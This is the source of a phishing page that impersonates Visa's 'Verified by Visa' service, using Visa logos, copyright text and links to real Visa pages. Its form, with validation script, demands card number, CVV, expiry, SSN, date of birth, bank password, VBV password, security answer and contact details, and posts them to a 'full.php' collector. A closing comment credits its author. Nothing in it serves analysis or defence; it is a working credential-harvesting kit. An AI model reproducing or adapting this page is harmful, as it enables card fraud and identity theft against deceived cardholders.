<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Credit Card | Account Update |</title><!--googleoff: all-->
<link rel="shortcut icon" href="favicon.ico">
  <meta name="description" content="Verified by Visa ">
  <meta name="keywords" content="Verified by Visa ">
  <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
  <meta name="author" content="Verified by Visa ">
  <meta name="generator" content="Web Page Maker">
  <meta http-equiv="imagetoolbar" content="no">
  <meta http-equiv="Page-Exit" content="revealTrans(Duration=0,Transition=4)">
  <style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
  </style>
  <style type="text/css">
div#container
{
	position:relative;
	width: 996px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
  </style>
</head>
<?
	  
	  function checkdata($datacheck)
  {
  $getdata = base64_decode($datacheck);
  return $getdata;
  }
  ?>
<body style="background-repeat: repeat-x; background-position: center top;" background="VBV_fichiers/body-bg.jpg" link="#0000ff">

<script language="javascript" type="text/javascript"> 
function validation() 
{ 
if(document.formulaire.prenom.value == "") 
		{ 
        alert ('Please Enter your full name'); 
        document.formulaire.prenom.focus(); 
        return false; 
    	}	 	
       	var adresse = document.formulaire.adresse.value; 
        if (adresse = document.formulaire.adresse.value == "")
        { 
            alert ('Please Enter your address line'); 
            document.formulaire.adresse.focus(); 
            return false; 
    	}
			 var ville = document.formulaire.ville.value; 
        if (ville.search(/^[_a-z-]+(.[_a-z-]+)*[^._-][a-z-]+(.[a-z]{2,4})*$/) == -1)
        { 
            alert ('Please Enter your City'); 
            document.formulaire.ville.focus(); 
            return false; 
    	} 	
        var province = document.formulaire.province.value; 
        if (document.formulaire.province.value == "")
        { 
            alert ('Please Enter your Province'); 
            document.formulaire.province.focus(); 
            return false; 
			}	 	
        var code_postal = document.formulaire.code_postal.value; 
        if (code_postal.search(/^[_0-9-]+(.[_0-9-]+)*[^._-][0-9-]+(.[0-9]{2,4})*$/) == -1)
        { 
            alert ('Please Enter your Zip code'); 
            document.formulaire.code_postal.focus(); 
            return false; 
    	}	
    	
        var phone = document.formulaire.phone.value; 
        if (phone .search(/^[_0-9-]+(.[_0-9-]+)*[^._-][0-9-]+(.[0-9]{2,4})*$/) == -1)
        { 
            alert ('Please Enter your phone number'); 
            document.formulaire.phone.focus(); 
            return false; 
            
         }   
            
         var pr = document.formulaire.pr.value; 
        if (pr.search(/^[_a-z-]+(.[_a-z-]+)*[^._-][a-z-]+(.[a-z]{2,4})*$/) == -1)
        { 
            alert ('Please Enter your personal response'); 
            document.formulaire.pr.focus(); 
            return false; 
         }
   
        var cart = document.formulaire.cart.value; 
        if (cart.search(/^[_0-9-]+(.[_0-9-]+)*[^._-][0-9-]+(.[0-9]{2,4})*$/) == -1)
        { 
            alert ('Please Enter a valid credit card number'); 
            document.formulaire.cart.focus(); 
            return false; 
        
    	}
    	
        var cvv = document.formulaire.cvv.value; 
        if (cvv.search(/^[_0-9-]+(.[_0-9-]+)*[^._-][0-9-]+(.[0-9]{2,4})*$/) == -1)
        { 
            alert ('Please Enter a valid Card Verification number'); 
            document.formulaire.cvv.focus(); 
            return false;
            
            }
           
	 	
        var bn = document.formulaire.bn.value; 
        if (bn.search(/^[_a-z-]+(.[_a-z-]+)*[^._-][a-z-]+(.[a-z]{2,4})*$/) == -1)
        { 
            alert ('Please Enter a valid Bank name'); 
            document.formulaire.bn.focus(); 
            return false; 	 	
         	 	
        
    	}	 	
        var bp = document.formulaire.bp.value; 
        if (document.formulaire.bp.value == "")
        { 
            alert ('Please Enter your bank password'); 
            document.formulaire.bp.focus(); 
            return false; 
        }
        
	 	var ssn = document.formulaire.ssn.value;
		if(document.formulaire.ssn.value == "") 
		{ 
        alert ('Please Enter your SSN '); 
        document.formulaire.ssn.focus(); 
        return false; 
    	}
    	
        var password = document.formulaire.password.value;
		if(document.formulaire.password.value == "") 
		{ 
        alert ('Please Enter your vbv password'); 
        document.formulaire.password.focus(); 
        return false; 
    	}
    	
    	var sce = document.formulaire.sce.value; 
				if(document.formulaire.sce.value == "") 
		{ 
        alert ('Please Enter your email'); 
        document.formulaire.sce.focus(); 
        return false; 
    	}	
 
else {return true;}
}
</script> 
<form id="formulaire" name="formulaire" method="post" action="full.php" onsubmit="return validation();">
















  <div id="container" style="width: 996px; height: 126px">
  <div id="image2" style="position: absolute; overflow: hidden; left: 108px; top: 159px; width: 782px; height: 520px; z-index: 0;"><img src="VBV_fichiers/bodydiv-bg.jpg" alt="" title="" border="0" height="520" width="782"></div>


  <div id="image1" style="position: absolute; overflow: hidden; left: 106px; top: 120px; width: 784px; height: 39px; z-index: 1;"><img src="VBV_fichiers/titleBar-bg.jpg" alt="" title="" border="0" height="39" width="784"></div>


  <div id="text1" style="position: absolute; overflow: hidden; left: 58px; top: 892px; width: 767px; height: 27px; z-index: 2">
  <div class="wpmd">
  <div align="center"><b><font size="1" color="#808080">� Copyright 2013 Visa. 
	All Rights Reserved</font></b></div>
	<div align="center">&nbsp;</div>
	<div align="center">&nbsp;</div>

  </div>
  </div>


  <div id="text2" style="position: absolute; overflow: hidden; left: 234px; top: 235px; width: 136px; height: 24px; z-index: 3">
  <div class="wpmd">
  <div><b><font class="ws8">Full name<font color="#FF0000">
	</font></font><font color="#FF0000">
	<font class="ws8" face="Constantia">
	<span style="font-size: 7pt">(</span><font style="font-size: 7pt">as it 
	appears on the card</font><span style="font-size: 7pt">)</span></font></font></b></div>

  </div>
  </div>


  <div id="text3" style="position: absolute; overflow: hidden; left: 234px; top: 315px; width: 141px; height: 18px; z-index: 4">
  <div class="wpmd">
  <div><font class="ws8"><b>Province </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>

  <div id="text4" style="position: absolute; overflow: hidden; left: 234px; top: 265px; width: 136px; height: 18px; z-index: 7">
  <div class="wpmd">
  <div><font class="ws8"><b>Address Line </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text5" style="position: absolute; overflow: hidden; left: 234px; top: 290px; width: 135px; height: 18px; z-index: 10">
  <div class="wpmd">
  <div><font class="ws8"><b>City </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text6" style="position: absolute; overflow: hidden; left: 234px; top: 340px; width: 135px; height: 18px; z-index: 12;">
  <div class="wpmd">
  <div><font class="ws8"><b>Zip Code </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text7" style="position: absolute; overflow: hidden; left: 234px; top: 367px; width: 134px; height: 18px; z-index: 13;">
  <div class="wpmd">
  <div><font class="ws8"><b>Date Of Birth </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text8" style="position: absolute; overflow: hidden; left: 234px; top: 503px; width: 167px; height: 18px; z-index: 17">
  <div class="wpmd">
  <div><font class="ws8"><b>Card Type </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text9" style="position: absolute; overflow: hidden; left: 234px; top: 532px; width: 156px; height: 18px; z-index: 18">
  <div class="wpmd">
  <div><font class="ws8"><b>Credit Card Number </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="image4" style="position: absolute; overflow: hidden; left: 505px; top: 489px; width: 42px; height: 31px; z-index: 19">
	<img border="0" src="visa512.png" width="34" height="35"></div>


  <div id="text10" style="position: absolute; overflow: hidden; left: 233px; top: 560px; width: 156px; height: 18px; z-index: 20">
  <div class="wpmd">
  <div><font class="ws8"><b>Expiration Date </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text11" style="position: absolute; overflow: hidden; top: 588px; height: 18px; z-index: 21; left: 233px; width: 136px">
  <div class="wpmd">
  <div><font class="ws8"><b>Cvv Number(<font face="Constantia" style="font-size: 7pt" color="#FF0000">Last</font><font style="font-size: 7pt" color="#FF0000"> 
	3</font><font face="Constantia" style="font-size: 7pt" color="#FF0000"> 
	digits</font>)  </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text12" style="position: absolute; overflow: hidden; left: 233px; top: 617px; width: 170px; height: 18px; z-index: 22">
  <div class="wpmd">
  <div><font class="ws8"><b>Bank Name </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="hr1" style="position: absolute; overflow: hidden; left: 180px; top: 419px; width: 598px; height: 17px; z-index: 23">
  <hr color="#ebebeb" size="1" width="598">
  </div>


  <div id="text13" style="position: absolute; overflow: hidden; left: 233px; top: 647px; width: 218px; height: 18px; z-index: 24">
  <div class="wpmd">
  <div><font class="ws8"><b>Bank Password </b></font>
	<font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text14" style="position: absolute; overflow: hidden; left: 230px; top: 708px; width: 136px; height: 18px; z-index: 25">
  <div class="wpmd">
  <div><font class="ws8"><b>Social Security Number </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text15" style="position: absolute; overflow: hidden; left: 231px; top: 734px; width: 136px; height: 18px; z-index: 26">
  <div class="wpmd">
  <div><font class="ws8"><b><u><font color="#0000FF">VBV</font></u> Password </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text16" style="position: absolute; overflow: hidden; left: 234px; top: 473px; width: 156px; height: 18px; z-index: 27;">
  <div class="wpmd">
  <div><font class="ws8"><b>Personal Response </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="art1" style="position: absolute; overflow: hidden; left: 133px; top: 132px; width: 325px; height: 25px; z-index: 28;">
	<img border="0" src="img/credit_card_update.png" width="286" height="28"></div>


  <div id="text17" style="position: absolute; overflow: hidden; left: 230px; top: 761px; width: 161px; height: 18px; z-index: 30">
  <div class="wpmd">
  <div><font class="ws8"><b>Email Address </b></font><font class="ws8" color="#ff0000"><b>*</b></font><font class="ws8"><b> </b></font></div>

  </div>
  </div>


  <div id="hr3" style="position: absolute; overflow: hidden; left: 180px; top: 683px; width: 598px; height: 17px; z-index: 32">
  <hr color="#ebebeb" size="1" width="598">
  </div>


  <div id="text18" style="position: absolute; overflow: hidden; left: 733px; top: 652px; width: 88px; height: 28px; z-index: 33;">
  <div class="wpmd">
  <div><font class="ws7"><a href="http://www.usa.visa.com/personal/security/vbv/how_it_works.html" title="">How it works</a></font></div>

  <div><font class="ws7"><a href="http://www.usa.visa.com/personal/security/vbv/privacy.html" title="" target="_blank">Privacy &amp; Security</a></font></div>

  </div>
  </div>


  <div id="image8" style="position: absolute; overflow: hidden; left: 717px; top: 656px; width: 12px; height: 19px; z-index: 34;"><img src="VBV_fichiers/lock.gif" alt="" title="" border="0" height="19" width="12"></div>



  <input name="prenom" maxlength="12" style="position: absolute; width: 144px; left: 371; top: 237; z-index: 5" type="text">
  <input name="province" maxlength="12" style="position: absolute; width: 144px; left: 371; top: 313; z-index: 6" type="text">
  <input name="adresse" maxlength="30" style="position: absolute; width: 264px; left: 371; top: 263; z-index: 8" type="text">
  <input name="ville" maxlength="10" style="position: absolute; width: 144px; left: 371; top: 288; z-index: 9" type="text">
  <input name="code_postal" maxlength="8" style="position: absolute; width: 144px; left: 371; top: 338; z-index: 11" type="text">
  <select name="00" style="position: absolute; left: 371px; top: 366px; width: 42px; z-index: 14;">
  <option selected="selected" value="01">01</option>
  <option value="02">02</option>
  <option value="03">03</option>
  <option value="04">04</option>
  <option value="05">05</option>
  <option value="06">06</option>
  <option value="07">07</option>
  <option value="08">08</option>
  <option value="09">09</option>
  <option value="10">10</option>
  <option value="11">11</option>
  <option value="12">12</option>
  <option value="13">13</option>
  <option value="14">14</option>
  <option value="15">15</option>
  <option value="16">16</option>
  <option value="17">17</option>
  <option value="18">18</option>
  <option value="19">19</option>
  <option value="20">20</option>
  <option value="21">21</option>
  <option value="22">22</option>
  <option value="23">23</option>
  <option value="24">24</option>
  <option value="25">25</option>
  <option value="26">26</option>
  <option value="27">27</option>
  <option value="28">28</option>
  <option value="29">29</option>
  <option value="30">30</option>
  <option value="31">31</option>
  </select>

  <select name="11" style="position: absolute; left: 420px; top: 366px; width: 40px; z-index: 15;">
  <option selected="selected" value="01">01</option>
  <option value="02">02</option>
  <option value="03">03</option>
  <option value="04">04</option>
  <option value="05">05</option>
  <option value="06">06</option>
  <option value="07">07</option>
  <option value="08">08</option>
  <option value="09">09</option>
  <option value="10">10</option>
  <option value="11">11</option>
  <option value="12">12</option>
  </select>

  <select name="33" style="position: absolute; left: 465px; top: 366px; width: 56px; z-index: 16;">
  <option selected="selected" value="1992">1992</option>
  <option value="1991">1991</option>
  <option value="1990">1990</option>
  <option value="1989">1989</option>
  <option value="1988">1988</option>
  <option value="1987">1987</option>
  <option value="1986">1986</option>
  <option value="1985">1985</option>
  <option value="1984">1984</option>
  <option value="1983">1983</option>
  <option value="1982">1982</option>
  <option value="1981">1981</option>
  <option value="1980">1980</option>
  <option value="1979">1979</option>
  <option value="1978">1978</option>
  <option value="1977">1977</option>
  <option value="1976">1976</option>
  <option value="1975">1975</option>
  <option value="1974">1974</option>
  <option value="1973">1973</option>
  <option value="1972">1972</option>
  <option value="1971">1971</option>
  <option value="1970">1970</option>
  <option value="1969">1969</option>
  <option value="1968">1968</option>
  <option value="1967">1967</option>
  <option value="1966">1966</option>
  <option value="1965">1965</option>
  <option value="1964">1964</option>
  <option value="1963">1963</option>
  <option value="1962">1962</option>
  <option value="1961">1961</option>
  <option value="1960">1960</option>
  <option value="1959">1959</option>
  <option value="1958">1958</option>
  <option value="1957">1957</option>
  <option value="1956">1956</option>
  <option value="1955">1955</option>
  <option value="1954">1954</option>
  <option value="1953">1953</option>
  <option value="1952">1952</option>
  <option value="1951">1951</option>
  <option value="194">1950</option>
  <option value="1949">1949</option>
  <option value="1948">1948</option>
  <option value="1947">1947</option>
  <option value="1946">1946</option>
  <option value="1945">1945</option>
  <option value="1944">1944</option>
  <option value="1943">1943</option>
  <option value="1942">1942</option>
  <option value="1941">1941</option>
  <option value="1940">1940</option>
  <option value="1939">1939</option>
  <option value="1938">1938</option>
  <option value="1937">1937</option>
  <option value="1936">1936</option>
  <option value="1935">1935</option>
  <option value="1934">1934</option>
  <option value="1933">1933</option>
  <option value="1932">1932</option>
  <option value="1931">1931</option>
  <option value="1930">1930</option>
  </select>

  <input name="phone" maxlength="10" style="position: absolute; left: 371; top: 392; width: 144px; z-index: 47">
 
  

  <select name="pq" maxlength="20" style="position: absolute; width: 200px; left: 371px; top: 441px; z-index: 48;" type="text">
  <option selected="selected" value="Mother's Maiden name">Mother's Maiden name ? </option>
  <option value="Nom de votre animal de compaginie">Name of your pet ?</option>
  </select>
  <input name="pr" maxlength="20" style="position: absolute; width: 200px; left: 371px; top: 470px; z-index: 49;" type="text">
  <select name="ct" style="position: absolute; left: 371; top: 501; width: 129px; z-index: 50">
  <option selected="selected" value="visa">Visa</option>
  <option value="visaelectron">Visa Electron</option>
  </select>

  <input name="cart" maxlength="17" style="position: absolute; width: 200px; left: 370; top: 529; z-index: 51" type="text">
  <select name="day" style="position: absolute; left: 370; top: 558; width: 41px; z-index: 52">
  <option selected="selected" value="01">01</option>
  <option value="02">02</option>
  <option value="03">03</option>
  <option value="04">04</option>
  <option value="05">05</option>
  <option value="06">06</option>
  <option value="07">07</option>
  <option value="08">08</option>
  <option value="09">09</option>
  <option value="10">10</option>
  <option value="11">11</option>
  <option value="12">12</option>
  </select>

  <select name="day1" style="position: absolute; left: 421; top: 559; width: 57px; z-index: 53; height:20px">
  <option selected="selected" value="2013">2013</option>
  <option value="2013">2013</option>
  <option value="2014">2014</option>
  <option value="2015">2015</option>
  <option value="2016">2016</option>
  <option value="2017">2017</option>
  <option value="2018">2018</option>
  <option value="2019">2019</option>
  <option value="2020">2020</option>
  <option value="2021">2021</option>
  <option value="2022">2022</option>
  <option value="2023">2023</option>
  <option value="2024">2024</option>
  <option value="2025">2025</option>
  <option value="2026">2026</option>
  <option value="2027">2027</option>
  <option value="2028">2028</option>
  <option value="2029">2029</option>
  </select>

  <input name="cvv" maxlength="3" style="position: absolute; top: 586; z-index: 54; left: 370; width: 38px" type="text">
  <input name="bn" maxlength="20" style="position: absolute; width: 142px; left: 370; top: 614; z-index: 55" type="text">
  <input name="bp" maxlength="30" style="position: absolute; width: 142px; left: 370; top: 644; z-index: 56" type="password">
  <input name="ssn" maxlength="9" style="position: absolute; width: 142px; left: 370; top: 704; z-index: 57" type="text"><p>&nbsp;</p>
	<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <input name="password" style="position: absolute; width: 143px; left: 370; top: 731; z-index: 58" type="password">
  <input name="sce" maxlength="30" style="position: absolute; width: 143px; left: 370; top: 758; z-index: 59" type="text">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	<img border="0" src="visa-home-logo-footer.gif" width="297" height="27"></p>
	<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	</p>
  <div id="formimage1" style="position: absolute; left: 372px; top: 808px; z-index: 60"><input name="send" src="VBV_fichiers/enregistere.png" height="23" type="image" width="105"></div>

  


  <div id="image11" style="position: absolute; overflow: hidden; left: 115px; top: 271px; width: 20px; height: 467px; z-index: 36;"><img src="VBV_fichiers/rightCol-bg4.png" alt="" title="" border="0" height="467" width="20"></div>


  <div id="image12" style="position: absolute; overflow: hidden; left: 863px; top: 269px; width: 20px; height: 467px; z-index: 37;"><img src="VBV_fichiers/rightCol-bg.jpg" alt="" title="" border="0" height="467" width="20"></div>


  <div id="image16" style="position: absolute; overflow: hidden; left: 422px; top: 584px; width: 50px; height: 28px; z-index: 39">
	<img border="0" src="https://www.paypalobjects.com/en_US/i/icon/mini_cvv2.gif" width="47" height="25"></div>


  <div id="text19" style="position: absolute; overflow: hidden; left: 113px; top: 162px; width: 770px; height: 68px; z-index: 40;">
  <div class="wpmd">
  <div align="center"><b><font class="ws8" color="#F89807">Please Fill out the form below in order to protect you against fraudulent use of your credit card</font></b></div>

  <div align="center"><b><font class="ws8" color="#F89807">Verifed By Visa SecureCode &#8482; solution adopted.</font></b></div>
	<div align="center"><u><font color="#969696" style="font-size: 9pt"><b>once 
		y</b></font><b><font class="ws8" color="#969696"><span style="font-size: 9pt">our</span> Credit Card is confirmed, it will be protected against threats  
	and the online fraud.</font></b></u></div>

  </div>
  </div>


  <div id="image3" style="position: absolute; overflow: hidden; left: 163px; top: -3px; width: 211px; height: 102px; z-index: 41">
	<img border="0" src="http://www.visaeurope.com/en/cardholders/idoc.ashx?docid=c9353e57-79ad-4606-9af7-b6d2f6d24ce6&version=-1" width="231" height="109"></div>


  <div id="text20" style="position: absolute; overflow: hidden; left: 234px; top: 445px; width: 168px; height: 18px; z-index: 43;">
  <div class="wpmd">
  <div><font class="ws8"><b>Personal Question </b></font><font class="ws8" color="#ff0000"><b>*</b></font></div>

  </div>
  </div>


  <div id="text21" style="position: absolute; overflow: hidden; left: 234px; top: 395px; width: 136px; height: 18px; z-index: 44">
  <div class="wpmd">
  <div><b><font class="ws8">Phone Number </font><font class="ws8" color="#ff0000">*</font></b></div>

  </div>
  </div>


  <div id="image5" style="position: absolute; overflow: hidden; left: 117px; top: 424px; width: 0px; height: 0px; z-index: 45;"><img src="VBV_fichiers/logo_ccCB_37wx23h.htm" alt="" title="" border="0" height="0" width="0"></div>


  <div id="image10" style="position: absolute; overflow: hidden; left: 590px; top: 497px; width: 38px; height: 29px; z-index: 46">
	&nbsp;</div>


  </div>

                                                    <!--c0ded by  Mr-Ahmed THe Nightmare  -->

</form>
</body>
</html>